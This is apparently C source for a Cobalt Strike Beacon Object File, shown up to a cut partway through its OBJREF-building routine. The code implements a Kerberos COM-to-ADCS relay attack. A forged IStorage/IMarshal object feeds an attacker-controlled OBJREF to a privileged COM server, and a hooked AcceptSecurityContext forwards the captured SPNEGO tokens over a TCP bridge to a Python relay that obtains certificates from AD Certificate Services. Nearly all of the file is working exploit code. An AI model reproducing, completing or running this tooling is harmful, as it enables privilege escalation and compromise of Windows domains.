#define COBJMACROS
#define SECURITY_WIN32
#define _WIN32_WINNT 0x0601

/*
 * Kerberos-only COM-to-ADCS relay core. A custom-marshaled OBJREF makes a
 * privileged COM server reach this process, and the AcceptSecurityContext hook
 * exchanges its complete DCE/RPC SPNEGO tokens with the Python HTTP relay.
 * Python owns CSR/certificate handling; this component never requests tickets
 * or extracts credential material.
 */
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <sspi.h>
#include <rpc.h>
#include <rpcdcep.h>
#include <objidl.h>
#include <objbase.h>
#include "beacon.h"
#ifdef KRBRELAY_TEST_NDR_ACTIVATION
#include "dcom_activation.h"
#endif

#define BOF_IMPORT(dll, ret, call, name, args) DECLSPEC_IMPORT ret call dll##$##name args

BOF_IMPORT(KERNEL32, HANDLE, WINAPI, GetProcessHeap, (void));
BOF_IMPORT(KERNEL32, LPVOID, WINAPI, HeapAlloc, (HANDLE, DWORD, SIZE_T));
BOF_IMPORT(KERNEL32, BOOL, WINAPI, HeapFree, (HANDLE, DWORD, LPVOID));
BOF_IMPORT(KERNEL32, HANDLE, WINAPI, GetCurrentProcess, (void));
BOF_IMPORT(KERNEL32, HMODULE, WINAPI, GetModuleHandleW, (LPCWSTR));
BOF_IMPORT(KERNEL32, FARPROC, WINAPI, GetProcAddress, (HMODULE, LPCSTR));
BOF_IMPORT(KERNEL32, DWORD, WINAPI, GetLastError, (void));
BOF_IMPORT(KERNEL32, HANDLE, WINAPI, GetStdHandle, (DWORD));
BOF_IMPORT(KERNEL32, BOOL, WINAPI, WriteFile, (HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED));
BOF_IMPORT(KERNEL32, BOOL, WINAPI, CloseHandle, (HANDLE));
BOF_IMPORT(KERNEL32, void, WINAPI, Sleep, (DWORD));
BOF_IMPORT(KERNEL32, HANDLE, WINAPI, CreateThread, (LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD));
BOF_IMPORT(KERNEL32, DWORD, WINAPI, WaitForSingleObject, (HANDLE, DWORD));
BOF_IMPORT(KERNEL32, BOOL, WINAPI, VirtualProtect, (LPVOID, SIZE_T, DWORD, PDWORD));
BOF_IMPORT(KERNEL32, LPVOID, WINAPI, GlobalLock, (HGLOBAL));
BOF_IMPORT(KERNEL32, BOOL, WINAPI, GlobalUnlock, (HGLOBAL));
BOF_IMPORT(KERNEL32, SIZE_T, WINAPI, GlobalSize, (HGLOBAL));
BOF_IMPORT(OLE32, HRESULT, WINAPI, CoInitializeEx, (LPVOID, DWORD));
BOF_IMPORT(OLE32, HRESULT, WINAPI, CoInitializeSecurity, (PSECURITY_DESCRIPTOR, LONG, SOLE_AUTHENTICATION_SERVICE *, void *, DWORD, DWORD, void *, DWORD, void *));
BOF_IMPORT(OLE32, HRESULT, WINAPI, CreateILockBytesOnHGlobal, (HGLOBAL, BOOL, ILockBytes **));
BOF_IMPORT(OLE32, HRESULT, WINAPI, StgCreateDocfileOnILockBytes, (ILockBytes *, DWORD, DWORD, IStorage **));
BOF_IMPORT(OLE32, HRESULT, WINAPI, CreateStreamOnHGlobal, (HGLOBAL, BOOL, IStream **));
BOF_IMPORT(OLE32, HRESULT, WINAPI, GetHGlobalFromStream, (IStream *, HGLOBAL *));
BOF_IMPORT(OLE32, HRESULT, WINAPI, CoMarshalInterface, (IStream *, REFIID, IUnknown *, DWORD, void *, DWORD));
BOF_IMPORT(OLE32, HRESULT, WINAPI, CoGetInstanceFromIStorage, (COSERVERINFO *, REFCLSID, IUnknown *, DWORD, IStorage *, DWORD, MULTI_QI *));
BOF_IMPORT(OLE32, HRESULT, WINAPI, CLSIDFromString, (LPCOLESTR, LPCLSID));
BOF_IMPORT(OLE32, HRESULT, WINAPI, CreateObjrefMoniker, (IUnknown *, IMoniker **));
BOF_IMPORT(OLE32, HRESULT, WINAPI, CreateBindCtx, (DWORD, IBindCtx **));
BOF_IMPORT(OLE32, void, WINAPI, CoTaskMemFree, (LPVOID));
BOF_IMPORT(OLE32, LPVOID, WINAPI, CoTaskMemAlloc, (SIZE_T));
BOF_IMPORT(OLE32, void, WINAPI, CoUninitialize, (void));
BOF_IMPORT(CRYPT32, BOOL, WINAPI, CryptStringToBinaryW, (LPCWSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *));
BOF_IMPORT(RPCRT4, RPC_STATUS, RPC_ENTRY, RpcServerUseProtseqEpW, (RPC_WSTR, UINT, RPC_WSTR, void *));
BOF_IMPORT(RPCRT4, RPC_STATUS, RPC_ENTRY, RpcServerRegisterAuthInfoW, (RPC_WSTR, ULONG, RPC_AUTH_KEY_RETRIEVAL_FN, void *));
BOF_IMPORT(RPCRT4, RPC_STATUS, RPC_ENTRY, RpcServerRegisterIfEx, (RPC_IF_HANDLE, UUID *, RPC_MGR_EPV *, UINT, UINT, RPC_IF_CALLBACK_FN *));
BOF_IMPORT(RPCRT4, RPC_STATUS, RPC_ENTRY, RpcServerUnregisterIf, (RPC_IF_HANDLE, UUID *, UINT));
BOF_IMPORT(RPCRT4, RPC_STATUS, RPC_ENTRY, RpcStringBindingComposeW, (RPC_WSTR, RPC_WSTR, RPC_WSTR, RPC_WSTR, RPC_WSTR, RPC_WSTR *));
BOF_IMPORT(RPCRT4, RPC_STATUS, RPC_ENTRY, RpcBindingFromStringBindingW, (RPC_WSTR, RPC_BINDING_HANDLE *));
BOF_IMPORT(RPCRT4, RPC_STATUS, RPC_ENTRY, RpcEpResolveBinding, (RPC_BINDING_HANDLE, RPC_IF_HANDLE));
BOF_IMPORT(RPCRT4, RPC_STATUS, RPC_ENTRY, RpcBindingSetAuthInfoW, (RPC_BINDING_HANDLE, RPC_WSTR, ULONG, ULONG, RPC_AUTH_IDENTITY_HANDLE, ULONG));
BOF_IMPORT(RPCRT4, RPC_STATUS, RPC_ENTRY, RpcBindingFree, (RPC_BINDING_HANDLE *));
BOF_IMPORT(RPCRT4, RPC_STATUS, RPC_ENTRY, RpcStringFreeW, (RPC_WSTR *));
BOF_IMPORT(RPCRT4, RPC_STATUS, RPC_ENTRY, UuidCreate, (UUID *));
BOF_IMPORT(RPCRT4, RPC_STATUS, RPC_ENTRY, I_RpcGetBuffer, (PRPC_MESSAGE));
BOF_IMPORT(RPCRT4, RPC_STATUS, RPC_ENTRY, I_RpcSend, (PRPC_MESSAGE));
BOF_IMPORT(RPCRT4, RPC_STATUS, RPC_ENTRY, I_RpcSendReceive, (PRPC_MESSAGE));
BOF_IMPORT(RPCRT4, RPC_STATUS, RPC_ENTRY, I_RpcFreeBuffer, (PRPC_MESSAGE));
BOF_IMPORT(NTDLL, LONG, NTAPI, NtQueryInformationProcess, (HANDLE, ULONG, PVOID, ULONG, PULONG));
BOF_IMPORT(ADVAPI32, BOOL, WINAPI, LogonUserA, (LPCSTR, LPCSTR, LPCSTR, DWORD, DWORD, PHANDLE));
BOF_IMPORT(ADVAPI32, BOOL, WINAPI, ImpersonateLoggedOnUser, (HANDLE));
BOF_IMPORT(ADVAPI32, BOOL, WINAPI, RevertToSelf, (void));
BOF_IMPORT(SECUR32, PSecurityFunctionTableW, SEC_ENTRY, InitSecurityInterfaceW, (void));
BOF_IMPORT(WS2_32, int, WSAAPI, WSAStartup, (WORD, LPWSADATA));
BOF_IMPORT(WS2_32, int, WSAAPI, WSACleanup, (void));
BOF_IMPORT(WS2_32, SOCKET, WSAAPI, socket, (int, int, int));
BOF_IMPORT(WS2_32, int, WSAAPI, getaddrinfo, (PCSTR, PCSTR, const struct addrinfo *, struct addrinfo **));
BOF_IMPORT(WS2_32, void, WSAAPI, freeaddrinfo, (struct addrinfo *));
BOF_IMPORT(WS2_32, int, WSAAPI, connect, (SOCKET, const struct sockaddr *, int));
BOF_IMPORT(WS2_32, int, WSAAPI, send, (SOCKET, const char *, int, int));
BOF_IMPORT(WS2_32, int, WSAAPI, recv, (SOCKET, char *, int, int));
BOF_IMPORT(WS2_32, int, WSAAPI, closesocket, (SOCKET));

/* KRB1 v3 carries the relay tokens. The target is finished when IIS
   authenticates; enrollment and its final outcome belong to Python. */
#define BRIDGE_CLIENT_TOKEN 3
#define BRIDGE_SERVER_TOKEN 4
#define BRIDGE_AUTH_OK      5
#define BRIDGE_ERROR        6
#define BRIDGE_VERSION      3
#define MAX_TOKEN           65535u
#define MAX_ERROR           512u

typedef struct _ANCHOR ANCHOR;
typedef struct _TRIGGER TRIGGER;

struct _ANCHOR {
    const IUnknownVtbl *lpVtbl;
    LONG refs;
};

struct _TRIGGER {
    const IStorageVtbl *storageVtbl;
    const IMarshalVtbl *marshalVtbl;
    LONG refs;
    IStorage *backing;
    BYTE *objref;
    ULONG objref_len;
};

/* One mutable state object is sufficient because each invocation performs one
   relay before returning. stage/detail diagnose failures; trace is a call map. */
typedef struct {
    LONG initialized;
    SOCKET bridge;
    int wsa_ready;
    int com_ready;
    int callback_count;
    int success;
    int stage;
    int detail;
    int trace;
    int bridge_failed;
    int synthesize_security;
    int com_locked;
    char relay_host[256];
    int relay_port;
    WCHAR service_spn[256];
    WCHAR rpc_host[256];
    WCHAR rpc_endpoint[32];
    WCHAR trigger_clsid[64];
    BYTE *continuation;
    ULONG continuation_len;
    PSecurityFunctionTableW table;
    ACCEPT_SECURITY_CONTEXT_FN original_accept;
    int resolver_registered;
    LONG active_callbacks;
    ANCHOR anchor;
    TRIGGER trigger;
} RELAY_STATE;

typedef struct {
    void *Reserved1;
    void *PebBaseAddress;
    void *Reserved2[2];
    ULONG_PTR ProcessId;
    void *Reserved3;
} KPROCESS_BASIC_INFORMATION;

typedef struct {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} KUNICODE_STRING;

static RELAY_STATE g_state = {1};
static const GUID KIID_IUnknown={0x00000000,0,0,{0xc0,0,0,0,0,0,0,0x46}};
static const GUID KIID_IMarshal={0x00000003,0,0,{0xc0,0,0,0,0,0,0,0x46}};
static const GUID KIID_IStorage={0x0000000b,0,0,{0xc0,0,0,0,0,0,0,0x46}};

static int kmemeq(const void *a_, const void *b_, ULONG n) {
    const BYTE *a = (const BYTE *)a_, *b = (const BYTE *)b_;
    ULONG i;
    for (i = 0; i < n; ++i) if (a[i] != b[i]) return 0;
    return 1;
}

static void kcopy(void *d_, const void *s_, ULONG n) {
    BYTE *d = (BYTE *)d_; const BYTE *s = (const BYTE *)s_;
    ULONG i; for (i = 0; i < n; ++i) d[i] = s[i];
}

static void kzero(void *d_, ULONG n) { BYTE *d = (BYTE *)d_; ULONG i; for (i = 0; i < n; ++i) d[i] = 0; }
static LONG atomic_add(volatile LONG *value,LONG delta) { return __sync_add_and_fetch(value,delta); }
static LONG atomic_read(volatile LONG *value) { return __sync_val_compare_and_swap(value,0,0); }
static int ascii_to_wide(const char *source, int source_len, WCHAR *target, ULONG target_count) {
    int i, chars = source_len > 0 && source[source_len - 1] == 0 ? source_len - 1 : source_len;
    if (!source || chars < 1 || (ULONG)chars >= target_count) return 0;
    for (i = 0; i < chars; ++i) { if ((BYTE)source[i] > 0x7f) return 0; target[i] = (WCHAR)(BYTE)source[i]; }
    target[chars] = 0; return 1;
}
static void decimal_port(int value, char out[6]) {
    int i = 5; out[i] = 0;
    do { out[--i] = (char)('0' + value % 10); value /= 10; } while (value && i);
    if (i) { int j = 0; while (i <= 5) out[j++] = out[i++]; }
}
static WORD rd16(const BYTE *p) { return (WORD)(p[0] | ((WORD)p[1] << 8)); }
static void wr16(BYTE *p, WORD x) { p[0] = (BYTE)x; p[1] = (BYTE)(x >> 8); }
static ULONG rd32be(const BYTE *p) { return ((ULONG)p[0] << 24) | ((ULONG)p[1] << 16) | ((ULONG)p[2] << 8) | p[3]; }
static void wr32be(BYTE *p, ULONG x) { p[0]=(BYTE)(x>>24); p[1]=(BYTE)(x>>16); p[2]=(BYTE)(x>>8); p[3]=(BYTE)x; }
static void wr32(BYTE *p, ULONG x) { p[0]=(BYTE)x; p[1]=(BYTE)(x>>8); p[2]=(BYTE)(x>>16); p[3]=(BYTE)(x>>24); }
static void *alloc(SIZE_T n) { return KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, n); }
static void release(void *p) { if (p) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, p); }
#ifdef KRBRELAY_TEST_NDR_ACTIVATION
void *__RPC_USER MIDL_user_allocate(size_t n) { return alloc(n); }
void __RPC_USER MIDL_user_free(void *p) { release(p); }
#endif

/* RPCSS remote-activation interface; retained for focused test builds without
   generated MIDL code. Normal production activation uses OLE32 below. */
static const RPC_CLIENT_INTERFACE activation_interface = {
    sizeof(RPC_CLIENT_INTERFACE),
    {{0x4d9f4ab8,0x7d1c,0x11cf,{0x86,0x1e,0x00,0x20,0xaf,0x6e,0x7c,0x57}},{0,0}},
    {{0x8a885d04,0x1ceb,0x11c9,{0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60}},{2,0}},
    NULL,0,NULL,0,NULL,0
};
/* The advertised IObjectExporter surface establishes the endpoint and auth
   context. COM activation supplies the meaningful unmarshalling operation. */
static void RPC_ENTRY resolver_dispatch(PRPC_MESSAGE message) {
    atomic_add(&g_state.active_callbacks,1);
    message->BufferLength=0;
    atomic_add(&g_state.active_callbacks,-1);
}
/* Initialize callback pointers at runtime so the COFF contains no absolute
   code-pointer relocations. Nonzero scalar sentinels keep these in .data
   instead of an unsupported zero-fill .bss section. */
static RPC_DISPATCH_FUNCTION resolver_functions[6]={(RPC_DISPATCH_FUNCTION)1};
static RPC_DISPATCH_TABLE resolver_table={1,NULL,0};
static RPC_SERVER_INTERFACE resolver_interface={1};

/* TCP is a byte stream: bridge framing must tolerate short sends/receives. */
static int send_all(SOCKET s, const BYTE *data, ULONG length) {
    ULONG used = 0; int n;
    while (used < length) {
        n = WS2_32$send(s, (const char *)data + used, (int)(length - used), 0);
        if (n <= 0) return 0;
        used += (ULONG)n;
    }
    return 1;
}

static int recv_all(SOCKET s, BYTE *data, ULONG length) {
    ULONG used = 0; int n;
    while (used < length) {
        n = WS2_32$recv(s, (char *)data + used, (int)(length - used), 0);
        if (n <= 0) return 0;
        used += (ULONG)n;
    }
    return 1;
}

static int send_record(BYTE kind, const BYTE *data, ULONG length);
static int recv_record(BYTE *kind, BYTE **data, ULONG *length);
static void report_bridge_error(BYTE *data,ULONG length);

/* Connect lazily at the first callback and reuse one bridge socket so Python
   can keep the same IIS connection throughout mutual authentication. */
static int bridge_connect(void) {
    WSADATA wd; struct addrinfo hints,*addresses=NULL,*current; char service[6];
    if (g_state.bridge != INVALID_SOCKET) return 1;
    BeaconPrintf(CALLBACK_OUTPUT,"[*] Resolving and connecting bridge to %s:%d\n",g_state.relay_host,g_state.relay_port);
    if (!g_state.wsa_ready) {
        if (WS2_32$WSAStartup(MAKEWORD(2,2), &wd)) return 0;
        g_state.wsa_ready = 1;
    }
    decimal_port(g_state.relay_port,service);kzero(&hints,sizeof(hints));hints.ai_family=AF_INET;hints.ai_socktype=SOCK_STREAM;hints.ai_protocol=IPPROTO_TCP;
    if(WS2_32$getaddrinfo(g_state.relay_host,service,&hints,&addresses)||!addresses)return 0;
    for(current=addresses;current;current=current->ai_next){g_state.bridge=WS2_32$socket(current->ai_family,current->ai_socktype,current->ai_protocol);if(g_state.bridge!=INVALID_SOCKET&&WS2_32$connect(g_state.bridge,current->ai_addr,(int)current->ai_addrlen)==0)break;if(g_state.bridge!=INVALID_SOCKET)WS2_32$closesocket(g_state.bridge);g_state.bridge=INVALID_SOCKET;}
    WS2_32$freeaddrinfo(addresses);if(g_state.bridge==INVALID_SOCKET)return 0;
    BeaconPrintf(CALLBACK_OUTPUT,"[+] Connected to the Python relay\n");return 1;
}

static ULONG record_limit(BYTE kind) {
    if(kind==BRIDGE_AUTH_OK)return 0;
    if(kind==BRIDGE_CLIENT_TOKEN||kind==BRIDGE_SERVER_TOKEN)return MAX_TOKEN;
    if(kind==BRIDGE_ERROR)return MAX_ERROR;
    return (ULONG)-1;
}

static ULONG record_minimum(BYTE kind) {
    if(kind==BRIDGE_CLIENT_TOKEN||kind==BRIDGE_SERVER_TOKEN)return 1;
    return 0;
}

/* KRB1 uses network byte order, unlike the little-endian BOF argument block. */
static int send_record(BYTE kind, const BYTE *data, ULONG length) {
    BYTE h[12] = {'K','R','B','1',BRIDGE_VERSION,0,0,0,0,0,0,0};ULONG limit=record_limit(kind),minimum=record_minimum(kind);
    if(limit==(ULONG)-1||length<minimum||length>limit)return 0;
    h[5] = kind; wr32be(h + 8, length);
    return send_all(g_state.bridge, h, sizeof(h)) && (!length || send_all(g_state.bridge, data, length));
}

static int recv_record(BYTE *kind, BYTE **data, ULONG *length) {
    BYTE h[12]; ULONG n,limit,minimum;
    *data = NULL; *length = 0;
    if (!recv_all(g_state.bridge, h, sizeof(h))) return 0;
    if (h[0]!='K'||h[1]!='R'||h[2]!='B'||h[3]!='1'||h[4]!=BRIDGE_VERSION||h[6]||h[7]) return 0;
    *kind=h[5];n=rd32be(h+8);limit=record_limit(*kind);minimum=record_minimum(*kind);
    if(limit==(ULONG)-1||n<minimum||n>limit)return 0;
    if (n) { *data = (BYTE *)alloc((SIZE_T)n+1); if (!*data || !recv_all(g_state.bridge, *data, n)) { release(*data); *data=NULL; return 0; } }
    *length = n; return 1;
}

/* Relay errors contain non-secret text only. Clamp and sanitize before Beacon. */
static void report_bridge_error(BYTE *data,ULONG length) {
    ULONG i;g_state.bridge_failed=1;if(!data||!length){BeaconPrintf(CALLBACK_ERROR,"[-] Python relay returned an unspecified error\n");return;}
    if(length>512)length=512;for(i=0;i<length;i++)if(data[i]<0x20||data[i]>0x7e)data[i]=' ';data[length]=0;
    BeaconPrintf(CALLBACK_ERROR,"[-] Python relay: %s\n",(char*)data);
}

static int recv_auth_reply(BYTE *kind,BYTE **data,ULONG *length) {
    if(!recv_record(kind,data,length))return 0;
    if(*kind==BRIDGE_SERVER_TOKEN||*kind==BRIDGE_AUTH_OK||*kind==BRIDGE_ERROR)return 1;
    release(*data);*data=NULL;*length=0;g_state.bridge_failed=1;
    BeaconPrintf(CALLBACK_ERROR,"[-] Python relay returned an out-of-state bridge message\n");return 0;
}

/*
 * COM facade: IStorage calls use a real in-memory compound file, while the
 * IMarshal implementation substitutes the attacker-controlled OBJREF. The
 * privileged out-of-process server unmarshals that OBJREF in its own context.
 */
static TRIGGER *trigger_from(void *This) { (void)This; return &g_state.trigger; }

static HRESULT STDMETHODCALLTYPE anchor_qi(IUnknown *This, REFIID riid, void **ppv) {
    ANCHOR *a = (ANCHOR *)This;
    if (!ppv) return E_POINTER; *ppv = NULL;
    if (kmemeq(riid, &KIID_IUnknown, sizeof(GUID))) { *ppv = a; ++a->refs; return S_OK; }
    return E_NOINTERFACE;
}
static ULONG STDMETHODCALLTYPE anchor_add(IUnknown *This) { return (ULONG)++((ANCHOR *)This)->refs; }
static ULONG STDMETHODCALLTYPE anchor_release(IUnknown *This) { ANCHOR *a=(ANCHOR*)This; if (a->refs > 1) --a->refs; return (ULONG)a->refs; }

static HRESULT STDMETHODCALLTYPE trigger_qi(IStorage *This, REFIID riid, void **ppv) {
    TRIGGER *t = trigger_from(This);
    g_state.trace|=1;
    if (!ppv) return E_POINTER; *ppv = NULL;
    if (kmemeq(riid,&KIID_IUnknown,sizeof(GUID)) || kmemeq(riid,&KIID_IStorage,sizeof(GUID))) *ppv=&t->storageVtbl;
    else if (kmemeq(riid,&KIID_IMarshal,sizeof(GUID))) {g_state.trace|=2;*ppv=&t->marshalVtbl;}
    else return E_NOINTERFACE;
    ++t->refs; return S_OK;
}
static ULONG STDMETHODCALLTYPE trigger_add(IStorage *This) { TRIGGER *t=trigger_from(This); return (ULONG)++t->refs; }
static ULONG STDMETHODCALLTYPE trigger_release(IStorage *This) { TRIGGER *t=trigger_from(This); if(t->refs>1)--t->refs; return (ULONG)t->refs; }
#define TFWD0(name) static HRESULT STDMETHODCALLTYPE tr_##name(IStorage *x) { return g_state.trigger.backing->lpVtbl->name(g_state.trigger.backing); }
static HRESULT STDMETHODCALLTYPE tr_CreateStream(IStorage*x,LPCOLESTR a,DWORD b,DWORD c,DWORD d,IStream**e){return g_state.trigger.backing->lpVtbl->CreateStream(g_state.trigger.backing,a,b,c,d,e);}
static HRESULT STDMETHODCALLTYPE tr_OpenStream(IStorage*x,LPCOLESTR a,void*b,DWORD c,DWORD d,IStream**e){return g_state.trigger.backing->lpVtbl->OpenStream(g_state.trigger.backing,a,b,c,d,e);}
static HRESULT STDMETHODCALLTYPE tr_CreateStorage(IStorage*x,LPCOLESTR a,DWORD b,DWORD c,DWORD d,IStorage**e){return g_state.trigger.backing->lpVtbl->CreateStorage(g_state.trigger.backing,a,b,c,d,e);}
static HRESULT STDMETHODCALLTYPE tr_OpenStorage(IStorage*x,LPCOLESTR a,IStorage*b,DWORD c,SNB d,DWORD e,IStorage**f){return g_state.trigger.backing->lpVtbl->OpenStorage(g_state.trigger.backing,a,b,c,d,e,f);}
static HRESULT STDMETHODCALLTYPE tr_CopyTo(IStorage*x,DWORD a,const IID*b,SNB c,IStorage*d){return g_state.trigger.backing->lpVtbl->CopyTo(g_state.trigger.backing,a,b,c,d);}
static HRESULT STDMETHODCALLTYPE tr_MoveElementTo(IStorage*x,LPCOLESTR a,IStorage*b,LPCOLESTR c,DWORD d){return g_state.trigger.backing->lpVtbl->MoveElementTo(g_state.trigger.backing,a,b,c,d);}
static HRESULT STDMETHODCALLTYPE tr_Commit(IStorage*x,DWORD a){return g_state.trigger.backing->lpVtbl->Commit(g_state.trigger.backing,a);}
static HRESULT STDMETHODCALLTYPE tr_EnumElements(IStorage*x,DWORD a,void*b,DWORD c,IEnumSTATSTG**d){return g_state.trigger.backing->lpVtbl->EnumElements(g_state.trigger.backing,a,b,c,d);}
static HRESULT STDMETHODCALLTYPE tr_Stat(IStorage*x,STATSTG*a,DWORD b){
    const WCHAR name[]=L"hello.stg";HRESULT hr;g_state.trace|=16;
    hr=g_state.trigger.backing->lpVtbl->Stat(g_state.trigger.backing,a,b);
    if(SUCCEEDED(hr)&&a){if(a->pwcsName)OLE32$CoTaskMemFree(a->pwcsName);a->pwcsName=(LPOLESTR)OLE32$CoTaskMemAlloc(sizeof(name));if(a->pwcsName)kcopy(a->pwcsName,name,sizeof(name));}
    return hr;
}
static HRESULT STDMETHODCALLTYPE tr_DestroyElement(IStorage*x,LPCOLESTR a){return g_state.trigger.backing->lpVtbl->DestroyElement(g_state.trigger.backing,a);}
static HRESULT STDMETHODCALLTYPE tr_RenameElement(IStorage*x,LPCOLESTR a,LPCOLESTR b){(void)x;(void)a;(void)b;return S_OK;}
TFWD0(Revert)
static HRESULT STDMETHODCALLTYPE tr_SetElementTimes(IStorage*x,LPCOLESTR a,const FILETIME*b,const FILETIME*c,const FILETIME*d){(void)x;(void)a;(void)b;(void)c;(void)d;return S_OK;}
static HRESULT STDMETHODCALLTYPE tr_SetClass(IStorage*x,REFCLSID a){(void)x;(void)a;return S_OK;}
static HRESULT STDMETHODCALLTYPE tr_SetStateBits(IStorage*x,DWORD a,DWORD b){(void)x;(void)a;(void)b;return S_OK;}

static HRESULT STDMETHODCALLTYPE marshal_qi(IMarshal *This, REFIID riid, void **ppv) { return trigger_qi((IStorage *)This,riid,ppv); }
static ULONG STDMETHODCALLTYPE marshal_add(IMarshal *This){return trigger_add((IStorage*)This);}
static ULONG STDMETHODCALLTYPE marshal_release(IMarshal *This){return trigger_release((IStorage*)This);}
static HRESULT STDMETHODCALLTYPE marshal_class(IMarshal*x,REFIID a,void*b,DWORD c,void*d,DWORD e,CLSID*f){
    static const CLSID stdmarshal={0x00000306,0,0,{0xc0,0,0,0,0,0,0,0x46}};
    (void)x;(void)a;(void)b;(void)c;(void)d;(void)e;g_state.trace|=4; *f=stdmarshal; return S_OK;
}
static HRESULT STDMETHODCALLTYPE marshal_size(IMarshal*x,REFIID a,void*b,DWORD c,void*d,DWORD e,DWORD*f){(void)x;(void)a;(void)b;(void)c;(void)d;(void)e;*f=1024;return S_OK;}
static HRESULT STDMETHODCALLTYPE marshal_iface(IMarshal*x,IStream*s,REFIID a,void*b,DWORD c,void*d,DWORD e){ULONG n=0;(void)x;(void)a;(void)b;(void)c;(void)d;(void)e;g_state.trace|=8;return s->lpVtbl->Write(s,g_state.trigger.objref,g_state.trigger.objref_len,&n);}
static HRESULT STDMETHODCALLTYPE marshal_unmarshal(IMarshal*x,IStream*s,REFIID a,void**b){(void)x;(void)s;(void)a;*b=NULL;return E_NOTIMPL;}
static HRESULT STDMETHODCALLTYPE marshal_release_data(IMarshal*x,IStream*s){(void)x;(void)s;return S_OK;}
static HRESULT STDMETHODCALLTYPE marshal_disconnect(IMarshal*x,DWORD a){(void)x;(void)a;return S_OK;}

static IUnknownVtbl anchor_vtbl={(void*)1};
static IStorageVtbl storage_vtbl={(void*)1};
static IMarshalVtbl marshal_vtbl={(void*)1};

static void prepare_interfaces(void) {
    /* Construct callback tables after Cobalt places the COFF at its final
       address, avoiding loader-specific IMAGE_REL_AMD64_ADDR64 support. */
    int i;
    anchor_vtbl.QueryInterface=anchor_qi;anchor_vtbl.AddRef=anchor_add;anchor_vtbl.Release=anchor_release;
    storage_vtbl.QueryInterface=(void*)trigger_qi;storage_vtbl.AddRef=(void*)trigger_add;storage_vtbl.Release=(void*)trigger_release;
    storage_vtbl.CreateStream=tr_CreateStream;storage_vtbl.OpenStream=tr_OpenStream;storage_vtbl.CreateStorage=tr_CreateStorage;storage_vtbl.OpenStorage=tr_OpenStorage;
    storage_vtbl.CopyTo=tr_CopyTo;storage_vtbl.MoveElementTo=tr_MoveElementTo;storage_vtbl.Commit=tr_Commit;storage_vtbl.Revert=tr_Revert;
    storage_vtbl.EnumElements=tr_EnumElements;storage_vtbl.DestroyElement=tr_DestroyElement;storage_vtbl.RenameElement=tr_RenameElement;
    storage_vtbl.SetElementTimes=tr_SetElementTimes;storage_vtbl.SetClass=tr_SetClass;storage_vtbl.SetStateBits=tr_SetStateBits;storage_vtbl.Stat=tr_Stat;
    marshal_vtbl.QueryInterface=(void*)marshal_qi;marshal_vtbl.AddRef=(void*)marshal_add;marshal_vtbl.Release=(void*)marshal_release;
    marshal_vtbl.GetUnmarshalClass=marshal_class;marshal_vtbl.GetMarshalSizeMax=marshal_size;marshal_vtbl.MarshalInterface=marshal_iface;
    marshal_vtbl.UnmarshalInterface=marshal_unmarshal;marshal_vtbl.ReleaseMarshalData=marshal_release_data;marshal_vtbl.DisconnectObject=marshal_disconnect;
    for(i=0;i<6;i++)resolver_functions[i]=resolver_dispatch;
    resolver_table.DispatchTableCount=6;resolver_table.DispatchTable=resolver_functions;resolver_table.Reserved=0;
    kzero(&resolver_interface,sizeof(resolver_interface));resolver_interface.Length=sizeof(resolver_interface);
    resolver_interface.InterfaceId.SyntaxGUID.Data1=0x99fcfec4;resolver_interface.InterfaceId.SyntaxGUID.Data2=0x5260;resolver_interface.InterfaceId.SyntaxGUID.Data3=0x101b;
    resolver_interface.InterfaceId.SyntaxGUID.Data4[0]=0xbb;resolver_interface.InterfaceId.SyntaxGUID.Data4[1]=0xcb;resolver_interface.InterfaceId.SyntaxGUID.Data4[4]=0x00;resolver_interface.InterfaceId.SyntaxGUID.Data4[5]=0x21;resolver_interface.InterfaceId.SyntaxGUID.Data4[6]=0x34;resolver_interface.InterfaceId.SyntaxGUID.Data4[7]=0x7a;
    resolver_interface.TransferSyntax.SyntaxGUID.Data1=0x8a885d04;resolver_interface.TransferSyntax.SyntaxGUID.Data2=0x1ceb;resolver_interface.TransferSyntax.SyntaxGUID.Data3=0x11c9;
    resolver_interface.TransferSyntax.SyntaxGUID.Data4[0]=0x9f;resolver_interface.TransferSyntax.SyntaxGUID.Data4[1]=0xe8;resolver_interface.TransferSyntax.SyntaxGUID.Data4[2]=0x08;resolver_interface.TransferSyntax.SyntaxGUID.Data4[5]=0x10;resolver_interface.TransferSyntax.SyntaxGUID.Data4[6]=0x48;resolver_interface.TransferSyntax.SyntaxGUID.Data4[7]=0x60;
    resolver_interface.TransferSyntax.SyntaxVersion.MajorVersion=2;resolver_interface.DispatchTable=&resolver_table;
}

static int build_objref(void) {
    IMoniker *moniker=NULL; IBindCtx *bind=NULL; LPOLESTR display=NULL;
    BYTE *original=NULL,*p,*security;
    ULONG original_len=0,address_chars=0,address_words,string_words,sec_words,total_words,i,display_len=0,spn_chars=0;
    HRESULT hr;
#if defined(KRBRELAY_TEST_RAW_OBJREF)
    if(g_state.com_locked){
        original_len=68;original=(BYTE*)alloc(original_len);if(!original)return 0;
        wr32(original,0x574f454d);wr32(original+4,1);kcopy(original+8,&KIID_IUnknown,16);
        wr32(original+24,0);wr32(original+28,1);RPCRT4$UuidCreate((UUID*)(original+32));RPCRT4$UuidCreate((UUID*)(original+48));
        goto raw_objref_ready;
    }
#endif
    /* Obtain a valid standard OBJREF from COM so its OXID/OID/IPID agree with
       RPCSS. Replace only the dual-string array selecting the local TCP RPC
       binding and the security binding containing the caller-supplied SPN. */
    g_state.stage=61;hr=OLE32$CreateObjrefMoniker((IUnknown*)&g_state.anchor,&moniker);
    if(FAILED(hr)||!moniker)return 0;
    g_state.stage=62;hr=OLE32$CreateBindCtx(0,&bind);
    if(FAILED(hr)||!bind){IMoniker_Release(moniker);return 0;}
    g_state.stage=63;hr=moniker->lpVtbl->GetDisplayName(moniker,bind,NULL,&display);
    if(FAILED(hr)||!display){IBindCtx_Release(bind);IMoniker_Release(moniker);return 0;}
    while(display[display_len])display_len++;
    if(display_len<9||display[0]!='o'||display[1]!='b'||display[2]!='j'||display[3]!='r'||display[4]!='e'||display[5]!='f'||display[6]!=':'||display[display_len-1]!=':'){g_state.stage=634;goto objref_done;}
